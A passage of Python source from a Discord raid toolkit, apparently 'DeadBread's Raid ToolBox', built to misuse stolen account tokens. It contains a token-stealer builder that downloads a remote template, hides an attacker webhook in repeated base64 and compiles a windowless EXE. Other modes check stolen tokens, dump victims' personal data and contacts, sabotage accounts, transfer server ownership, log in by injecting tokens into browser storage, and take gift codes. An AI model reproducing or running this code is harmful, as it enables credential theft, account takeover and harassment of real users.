                     ':u6708:', ':u6709:', ':u6e80:', ':u7121:', ':u7533:', ':u7a7a:', ':u7981:', ':sa:', ':restroom:', ':mens:', ':womens:', ':baby_symbol:',
                     ':no_smoking:', ':parking:', ':wheelchair:', ':metro:', ':baggage_claim:', ':accept:', ':wc:', ':potable_water:', ':put_litter_in_its_place:',
                     ':secret:', ':congratulations:', ':m:', ':passport_control:', ':left_luggage:', ':customs:',  ':ideograph_advantage:', ':cl:', ':sos:',
                     ':id:', ':no_entry_sign:', ':underage:', ':no_mobile_phones:', ':do_not_litter:', ':non-potable_water:', ':no_bicycles:', ':no_pedestrians:',
                     ':children_crossing:', ':no_entry:', ':eight_spoked_asterisk:', ':sparkle:', ':eight_pointed_black_star:', ':heart_decoration:', ':vs:',
                     ':vibration_mode:', ':mobile_phone_off:', ':chart:', ':currency_exchange:', ':aries:', ':taurus:', ':gemini:', ':cancer:', ':leo:',
                     ':virgo:', ':libra:',  ':scorpius:', ':sagittarius:', ':capricorn:', ':aquarius:', ':pisces:', ':ophiuchus:', ':six_pointed_star:',
                     ':negative_squared_cross_mark:', ':a:', ':b:', ':ab:', ':o2:', ':diamond_shape_with_a_dot_inside:', ':recycle:', ':end:', ':back:',
                     ':on:', ':soon:', ':clock1:', ':clock130:', ':clock10:', ':clock1030:', ':clock11:', ':clock1130:', ':clock12:', ':clock1230:',
                     ':clock2:', ':clock230:', ':clock3:', ':clock330:', ':clock4:', ':clock430:', ':clock5:', ':clock530:',  ':clock6:', ':clock630:',
                     ':clock7:', ':clock730:', ':clock8:', ':clock830:', ':clock9:', ':clock930:', ':heavy_dollar_sign:', ':copyright:', ':registered:',
                     ':tm:', ':x:', ':bangbang:', ':interrobang:', ':o:', ':heavy_multiplication_x:', ':heavy_plus_sign:', ':heavy_minus_sign:',
                     ':heavy_division_sign:', ':white_flower:', ':100:', ':heavy_check_mark:', ':ballot_box_with_check:', ':radio_button:', ':link:',
                     ':curly_loop:', ':wavy_dash:', ':part_alternation_mark:',  ':trident:', ':black_small_square:', ':white_small_square:', ':black_medium_small_square:',
                     ':white_medium_small_square:', ':black_medium_square:', ':white_medium_square:', ':black_large_square:', ':white_large_square:', ':white_check_mark:',
                     ':black_square_button:', ':white_square_button:', ':black_circle:', ':white_circle:', ':red_circle:', ':large_blue_circle:', ':large_blue_diamond:',
                     ':large_orange_diamond:', ':small_blue_diamond:', ':small_orange_diamond:',  ':small_red_triangle:', ':small_red_triangle_down:']
        layout = [
                [sg.Text('Channel ID', size=(15, 1)), sg.InputText()],
                [sg.Text('Message ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Add','Remove'],default_value='Add',readonly=True,size=(14,1)), sg.Combo(emojilist,size=(10,1), default_value=":smile:")],
                [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | Message Reactor', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channel = values[0]
        message = values[1]
        type = values[2]
        emoji = emoji.emojize(values[3].rstrip(), use_aliases=True)
    else:
        message = sys.argv[6]
        channel = sys.argv[7]
        type = sys.argv[8]
        emoji = emoji.emojize(sys.argv[8].rstrip(), use_aliases=True)
    for token in tokenlist:
        executor.submit(addreact,token,emoji,message,channel,type)

elif mode == 'quickcheck':
    from colorama import init
    from termcolor import colored
    init()
    token = sys.argv[6]
    apilink = 'https://discordapp.com/api/v6/users/@me'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    src = requests.get(apilink, headers=headers)
    if "401: Unauthorized" in str(src.content):
        print(colored(token + " Invalid","red"))
    else:
        response = json.loads(src.content.decode())
        if response["verified"]:
            print(colored(token + " Valid","green"))
            with open ("quick_checked_tokens_verified.txt", "a+") as handle:
                handle.write(token+"\n")
        else:
            print(colored(token + " Unverified","yellow"))
            with open ("quick_checked_tokens_unverified.txt", "a+") as handle:
                handle.write(token+"\n")

elif mode == "StealerBuilder":
    if not sys.platform.startswith("win32"):
        sg.Popup("Only Supported on windows for now. Sorry.", title="Yikes")
        os.kill(os.getpid(), 15)
    if not os.path.exists("RTBStealerBuilder/"):
        os.mkdir("RTBStealerBuilder/")
    def build():
        global name
        global webhook
        global useicon
        global icon
        global Window
        global runonce
        global killdisc
        e = subprocess.call(['pyinstaller','-h'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
        if e == 1:
            print("Pyinstaller is not installed!")
            window.Refresh()
        else:
            os.chdir('RTBStealerBuilder/')
            pyname = name+'.py'
            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/0bb4d7dc9eddd26568b7afe39069a0f7af40cb8f/stealertemplate.py").text
            with open("template.py", "w+") as handle:
                handle.write(temp)
            with open("template.py") as f:
                lines = f.readlines()
            os.remove("template.py")
            with open(pyname, "w") as f:
                list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), str(uuid.uuid4())]
                lines.insert(11, f"a = {str(list_string)}")
                f.write("".join(lines))
            print("Building EXE, Please wait...")
            window.Refresh()
            if useicon:
                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
            else:
                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
            compiling.wait()
            print("EXE built, Cleaning up...")
            window.Refresh()
            shutil.rmtree('build')
            for root, dirs, files in os.walk('dist'):
                for file in files:
                    if file == ('{}.exe'.format(name)):
                        os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
            shutil.rmtree('dist')
            os.remove('{}.spec'.format(name))
            print("Finished!")
            window.Refresh()
    layout = [
            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1))],
            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Checkbox('', default=True, key="Run", tooltip="Only Run once per PC to prevent spam."), sg.Text('Close Discord', size=(10, 1)), sg.Checkbox('', default=False, key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)"), sg.Text('Base64 Cycles', size=(10, 1)), sg.Spin([i for i in range(0,50)], initial_value=1, key="Cycles", tooltip="More Cycles = Bigger and slower file"),  sg.Checkbox('Use Icon', key="Useicon")],
            [sg.Output(size=(80, 15))],
            [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
            ]
    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.2.0", layout)
    while True:
        event, values = window.Read(timeout=0)
        if event is None or event == 'Exit':
            break
        elif event == sg.TIMEOUT_KEY:
            window.Refresh()
        elif event == "Test":
            payload = {
            "username": "Raid ToolBox",
            "avatar_url": 'https://i.imgur.com/TioPl63.png',
            "content": "Test, Sent From Raid ToolBox"
            }
            try:
                src = requests.post(values["Webhook"], json=payload).text
                if src == "":
                    pass
                else:
                    j = ast.literal_eval(src)
                    try:
                        j['message']
                    except Exception:
                        pass
                    else:
                        print(j['message'])
                        raise Exception
            except Exception as e:
                print("Error Sending Payload")
            else:
                print("Sent Payload!")
        elif event == "Build":
            if values["namea"] == '':
                sg.PopupNonBlocking('Invalid Name!')
                continue
            if values["Webhook"] == '':
                sg.PopupNonBlocking('No webhook entered!')
                continue
            name = values["namea"]
            cycles = int(values["Cycles"])
            webhook = values["Webhook"].encode()
            useicon = values["Useicon"]
            icon = values["iconpath"]
            runonce = values['Run']
            killdisc = values['Close']
            for x in range(cycles):
                webhook = base64.b64encode(webhook)
            build()
    window.Close()

elif mode == "InfoToken":
    headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
    response = json.loads(src.content)
    try:
        info = "Name: {}#{}\nID: {}\nEmail: {}\nPhone: {}\nLanguage: {}\n".format(response['username'],response['discriminator'],response['id'],response['email'],response['phone'],response['locale'])
    except Exception:
        sg.Popup("Unable to get info on token.", title="Error")
    else:
        lay = [
              [sg.Multiline(info,size=(50,10))],
              [sg.Button("Export")]
              ]
        window = sg.Window("Information on {}".format(response['username'])).Layout(lay)
        event, values = window.Read()
        if event is None or event == 'Exit':
            pass
        elif event == "Export":
            if not os.path.isdir("users"):
                os.mkdir("users")
            with open("users/{}.txt".format(response['username']), "w+", errors='ignore') as handle:
                handle.write(info)
                sg.Popup("Exported info for {} to files/{}.txt".format(response['username'],response['username']),title="Exported")

elif mode == "HeavyInfo":
    sg.PopupNonBlocking("This May take a while.")
    import discord
    import unicodedata
    import string
    token = sys.argv[6]
    client = discord.Client()
    valid_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
    valid_filename_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
    char_limit = 255
    def clean_filename(filename, whitelist=valid_filename_chars, replace=' '):
        for r in replace:
            filename = filename.replace(r,'_')
        cleaned_filename = unicodedata.normalize('NFKD', filename).encode('ASCII', 'ignore').decode()
        cleaned_filename = ''.join(c for c in cleaned_filename if c in whitelist)
        if len(cleaned_filename)>char_limit:
            print("Warning, filename truncated because it was over {}. Filenames may no longer be unique".format(char_limit))
        return cleaned_filename[:char_limit]
    @client.event
    async def on_ready():
        fn = clean_filename(client.user.name)
        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        response = json.loads(src.content)
        if not os.path.exists("users"):
            os.mkdir('users')
        with open ('users/{}_HEAVY.txt'.format(client.user.name),'w+',errors='ignore') as handle:
            handle.write('====================================\n')
            handle.write('Token: '+token+'\n')
            handle.write('Email: '+str(client.user.email)+'\n')
            handle.write('Phone: '+str(response['phone'])+'\n')
            handle.write('Username: '+client.user.name+'#'+client.user.discriminator+'\n')
            handle.write('User ID: '+str(client.user.id)+'\n')
            handle.write('Locale: '+str(client.user.locale)+'\n')
            handle.write('Created on: '+str(client.user.created_at)+'\n')
            handle.write('Verified: '+str(client.user.verified)+'\n')
            handle.write('MFA Enabled: ' + str(client.user.mfa_enabled)+'\n')
            handle.write('Discord Nitro: '+str(client.user.premium)+'\n')
            handle.write('Discord Nitro Type: '+str(client.user.premium_type)+'\n')
            handle.write('Avatar URL: '+str(client.user.avatar_url)+'\n')
            handle.write('====================================\n')
            handle.write('Member of '+str(len(client.guilds))+' servers.\n')
            handle.write('User has '+str(len(client.user.friends))+' friends.\n')
            handle.write('User has blocked '+str(len(client.user.blocked))+' people.\n')
            handle.write('====================================\nFriends:\n====================================\n')
            if len(client.user.friends) == 0:
                handle.write('None.\n\n')
            else:
                for friend in client.user.friends:
                    handle.write('Name: '+str(friend.name)+'#'+str(friend.discriminator)+'\n')
                    handle.write('ID: '+str(friend.id)+'\n\n')
            handle.write('====================================\nBlocked Users:\n====================================\n')
            if len(client.user.blocked) == 0:
                handle.write('None.\n\n')
            else:
                for block in client.user.blocked:
                    handle.write('Name: '+str(block.name)+'#'+str(block.discriminator)+'\n')
                    handle.write('ID: '+str(block.id)+'\n\n')
            handle.write('====================================\nServers:\n====================================\n')
            if len(client.guilds) == 0:
                handle.write('None.\n\n')
            else:
                for server in client.guilds:
                    handle.write('Name: '+server.name+'\n')
                    handle.write('ID: '+str(server.id)+'\n')
                    if server.owner.id == client.user.id:
                        serverowner = True
                    else:
                        serverowner = False
                    for channel in server.text_channels:
                        myperms = channel.permissions_for(server.get_member(client.user.id))
                        break
                    handle.write('Member Count: ' + str(len(server.members))+'\n')
                    handle.write('Channel Count: '+str(len(server.channels))+'\n')
                    handle.write('Role Count: '+str(len(server.roles))+'\n')
                    handle.write('Owner: '+str(serverowner)+'\n')
                    handle.write('Admin: '+str(myperms.administrator)+'\n\n')
            handle.write('====================================\n')
        try:
            await client.close()
            sg.Popup("Heavy Info Gather is complete.",title="Complete")
        except Exception:
            pass
    client.run(token, bot=False)

elif mode == "Terminator":
    import discord
    token = sys.argv[6]
    client = discord.Client()
    @client.event
    async def on_ready():
        sg.PopupNonBlocking("Fucking the token, Please wait.")
        await client.change_presence(activity=discord.Game(name='help'), status=discord.Status.do_not_disturb, afk=True)
        for x in range(30):
            headers = {'Authorization': token}
            requests.post("https://canary.discordapp.com/api/v6/invite/uAsrUTu", headers=headers)
        await client.close()
        sg.Popup("Token was Fucked")
    sg.PopupNonBlocking("Preparing to fuck the token...",title="Starting")
    client.run(token,bot=False)

elif mode == "CG":
    from itertools import cycle
    token = sys.argv[6]
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    payload = {'theme': "light", 'locale': "ja", 'message_display_compact': 'true', 'enable_tts_command': 'false', 'inline_embed_media': 'false',
    'inline_attachment_media': 'false', 'gif_auto_play': 'false', 'render_embeds': 'false', 'render_reactions': 'false', 'animate_emoji': 'false',
    'convert_emoticons': 'false','enable_tts_command': 'true', 'explicit_content_filter': '0', 'status': "invisible"}
    requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers,json=payload)
    locales = ['da','de','es-ES','fr','hr','it','lt',"hu","nl","no","pl","pt-BR","ro","fi","sv-SE","vi","tr"]
    modes = cycle(["light","dark"])
    statuses = cycle(["online","idle","dnd","invisible"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(locales), 'status': next(statuses)}
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers,json=setting)

elif mode == "Ownership":
    lay = [
          [sg.Text('Server ID',size=(10,1)), sg.Input(key="ServerID")],
          [sg.Text('New Owner ID',size=(10,1)), sg.Input(key="OwnerID")],
          [sg.Button("Transfer")]
          ]
    window = sg.Window("Transfer Ownership").Layout(lay)
    event, values = window.Read()
    if event is None:
        pass
    else:
        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json'}
        payload = {'owner_id': values['OwnerID']}
        src = requests.patch("https://ptb.discordapp.com/api/v6/guilds/{}".format(values["ServerID"]),headers=headers,json=payload)
        sg.Popup("Ownership Should have been transferred.")

elif mode == "Logintoken":
    from selenium import webdriver
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36')
    driver = webdriver.Firefox(profile)
    script = """function login(token) {
                setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                location.reload();
                }, 2500);
                }
            """
    driver.get("https://canary.discordapp.com/login")
    driver.execute_script(script+'\nlogin("{}")'.format(sys.argv[6]))

elif mode == "DDDC":
    import discord
    import asyncio
    import re
    token = sys.argv[6]
    client = discord.Client()
    @client.event
    async def on_message(message):
        number = random.randint(1,51)
        if 'sayori' in message.content.lower() and message.author == client.user:
            if random.randint(1,3) == 1:
                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/ŞêýåŅĶäûų.png"))
                await asyncio.sleep(0.7)
                await file.delete()
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            dokitext = ''
            for x in range(15):
                gchar = random.choice(gtext)
                dokitext += gchar
            text = message.content.lower()
            text = re.sub(r'sayori', dokitext, text)
            try:
                await message.edit(content=str(text))
            except Exception as e:
                print (e)

        if number == 50 and message.author == client.user:
            glitchy = ""
            for x in range(1000):
                num = random.randrange(9999)
                glitchy = glitchy + chr(num)
            try:
                await message.edit(content=str(glitchy))
                await asyncio.sleep(random.randint(1,11))
                await message.delete()
            except Exception as e:
                print (e)

        if 'monika' in message.content.lower() and message.author == client.user:
            monika = "JUST MONIKA"
            for char in monika:
                try:
                    await message.edit(content=str(char))
                    await asyncio.sleep(1)
                except Exception as e:
                    print (e)
            mon = ''
            for char in monika:
                mon += char
                try:
                    await message.edit(content=str(mon))
                    await asyncio.sleep(1)
                except Exception as e:
                    print (e)
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            for x in range(3):
                dokitext = ''
                for x in range(15):
                    gchar = random.choice(gtext)
                    dokitext += gchar
                await message.edit(content=str(dokitext))
            await message.delete()

        if 'happy' in message.content.lower() and message.author == client.user:
            if random.randint(1,3) == 1:
                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/HAPPY.jpg"))
                await asyncio.sleep(random.randint(1,11))
                await file.delete()

        if number == 18 and message.author == client.user:
            original = str(message.content)
            monika = ('**JUST**','**MONIKA**','**JUST MONIKA**','**Mo**','**nika**','**Ju**','**st**')
            glitchy = ""
            for x in range(300):
                num = random.randrange(9999)
                if random.randint(1,3) == 1:
                    glitchy = glitchy + random.choice(monika)
                glitchy = glitchy + chr(num)
            try:
                await asyncio.sleep(1)
                await message.edit(content=str(glitchy))
                await asyncio.sleep(random.randint(1,11))
                await message.edit(content=str(original))
            except Exception:
                pass

        if number == 21 and message.author == client.user:
            files = ["RTBFiles/DDDC/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii.txt","RTBFiles/DDDC/hxppy thxughts.png","RTBFiles/DDDC/CAN YOU HEAR ME.txt","RTBFiles/DDDC/monika.chr","RTBFiles/DDDC/traceback.txt"]
            gtext = []
            text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
            for char in text:
                gtext.append(char)
            for x in range(3):
                dokitext = ''
                for x in range(15):
                    gchar = random.choice(gtext)
                    dokitext += gchar
            file = await message.channel.send(content=str(dokitext), file=discord.File(random.choice(files)))
            await asyncio.sleep(random.randint(1,21))
            await file.delete()
    client.run(token, bot=False)

elif mode == "Gifts":
    gifts = {}
    headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    src = requests.get("https://canary.discordapp.com/api/v6/users/@me/entitlements/gifts", headers=headers)
    s = json.loads(src.content)
    for app in s:
        gifts[app["subscription_plan"]["name"]] = str({"sku_id": app["sku_id"], "id": app["subscription_plan"]["id"]})
    layout = [
             [sg.Text("Available Gifts")]
             ]
    for g in gifts:
        layout.append([sg.Text(g, size=(50,1)), sg.Button("Take",key=g)])
    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory").Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            break
        elif event in list(gifts):
            g = ast.literal_eval(gifts[event])
            payload = {"sku_id": g['sku_id'],"subscription_plan_id": g["id"]}
            src = requests.post("https://canary.discordapp.com/api/v6/users/@me/entitlements/gift-codes", headers=headers, json=payload)
            f = json.loads(src.content)
            if f['code'] == 30022:
                sg.Popup("Maximum number of gifts has been reached for this SKU.", title="Code 30022")
            else:
                sg.PopupScrolled("https://discord.gift/{}".format(f['code']))
                with open("GIFT_CODES.txt", "a+") as handle:
                    handle.write("https://discord.gift/{}\n".format(f['code']))

elif mode == "FR Clearer":
    import discord
    client = discord.Client()
    token = sys.argv[6]

    def delete(userid):
        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/users/@me/relationships/{}".format(userid), headers=headers)

    @client.event
    async def on_ready():
        todecline = []
        for relation in client.user.relationships:
            if str(relation.type) == 'RelationshipType.incoming_request':
                todecline.append(relation.user.id)
        for user in todecline:
            executor.submit(delete,user)
        await client.logout()
    client.run(token, bot=False)

elif mode == "CPUWIDGET":
    # Thank you PySimpleGUI, Very Cool!
    import psutil
    layout = [[sg.Text('')],
              [sg.Text('', size=(8, 2), font=('Helvetica', 20), justification='center', key='text')],
              [sg.Exit(pad=((15, 0), 0)),
               sg.Spin([x + 1 for x in range(10)], 1, key='spin')]]
    window = sg.Window('Running Timer', layout, no_titlebar=True, auto_size_buttons=False, keep_on_top=True,
                       grab_anywhere=True)
    while True:
        event, values = window.Read(timeout=10)
        if event is None or event == 'Exit':
            break
        try:
            interval = int(values['spin'])
        except:
            interval = 1
        cpu_percent = psutil.cpu_percent(interval=interval)
        window.Element('text').Update(f'CPU {cpu_percent:02.0f}%')

elif mode == 'ree':
    picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
    pic = picdata.content
    while True:
        try:
            sg.PopupAnimated(pic, background_color='black', time_between_frames=40)
        except Exception:
            pass
